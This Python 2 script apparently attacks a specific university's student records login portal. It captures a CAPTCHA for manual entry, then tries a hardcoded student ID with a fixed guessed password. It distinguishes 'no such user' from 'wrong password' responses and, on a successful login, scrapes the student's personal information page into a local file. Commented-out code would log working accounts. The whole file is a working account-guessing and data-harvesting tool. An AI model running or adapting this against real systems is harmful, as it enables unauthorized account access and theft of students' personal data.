# !/usr/bin/env python
# -*- coding:utf-8 -*-

import requests
from lxml import html
import json
import sys
reload(sys)
sys.setdefaultencoding("utf8")



def fuz_unit(student_v, sss_id_v, code_fuz_v):
    url = "http://jwzx.usc.edu.cn/Login/Login"
    payload = {
        'UserName': student_v,
        'Password': '780820',
        'Code': code_fuz_v
    }
    cookies = {
        'ASP.NET_SessionId': sss_id_v
    }
    r = requests.post(url, data=payload, cookies=cookies)
    sss_id_new = r.cookies['.AspNet.ApplicationCookie']
    output = json.loads(r.text)
    message = output['message'].strip()
    if message == u'用户名不存在':
        print message
    elif message == u'密码错误':
        print message
    else:
        # file_output = open("good.txt", 'a')
        # file_output.write(student_v + "\n")
        # file_output.close()
        cookies_student = {
            'ASP.NET_SessionId': sss_id_v,
            '.AspNet.ApplicationCookie': sss_id_new
        }
        url_student = 'http://jwzx.usc.edu.cn/Student/StudentInfo'
        hello_student = requests.get(url_student, cookies=cookies_student)
        # print hello_student.text
        html_out = html.fromstring(hello_student.text)
        s = html_out.xpath('//tr/td/text()')
        print "success"
        print "hello"
        for s_unit in s:
            file_output = open("hello.txt", 'a')
            file_output.write(s_unit + ' ')
            file_output.close()
        file_output = open("hello.txt", 'a')
        file_output.write('\n')
        file_output.close()


if __name__ == "__main__":
    image_code = requests.get('http://jwzx.usc.edu.cn/Core/verify_code.ashx')
    with open('fuck.jpg', 'wb') as f:
        for chunk in image_code:
            f.write(chunk)
    f.close()

    sss_id_v = image_code.cookies['ASP.NET_SessionId']

    print("please input code:")
    code = raw_input()

    student_id = '20154330227'
    fuz_unit(student_id,sss_id_v,code)